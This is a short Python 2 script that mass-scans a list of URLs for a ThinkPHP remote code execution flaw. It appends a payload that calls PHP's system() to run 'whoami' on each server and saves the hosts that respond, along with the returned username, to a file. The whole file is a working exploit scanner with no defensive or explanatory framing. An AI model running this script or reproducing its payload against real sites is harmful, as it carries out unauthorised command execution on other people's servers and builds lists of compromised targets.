#coding:utf-8
import requests
def get_html():
        html = {}
        payload = r"/?s=index%2F%5Cthink%5CRequest/input&filter=system&data=whoami"
	f = open('url.txt')
	for line in f.readlines():
                try:
                        url = line.replace('\n','')+payload
                        req = requests.get(url, timeout=3)
                        val = req.text
                        if len(val) >= 1 and len(val) < 30:
                                print 'ok--------------'+str(url)+'----------'+str(val)								
                                data = open(r"ok.txt","a")
                                data.write(url+'\n'+'用户名：'+str(val)+'\n'+'--------------------------'+'\n')
                        else:
                                print 'no--------------'+str(url)
                        print '#########################################################################'					
                except Exception:
                        print 'error-------------'+str(url)
                        print '#########################################################################'
                        pass
if __name__=="__main__":
    get_html()
                
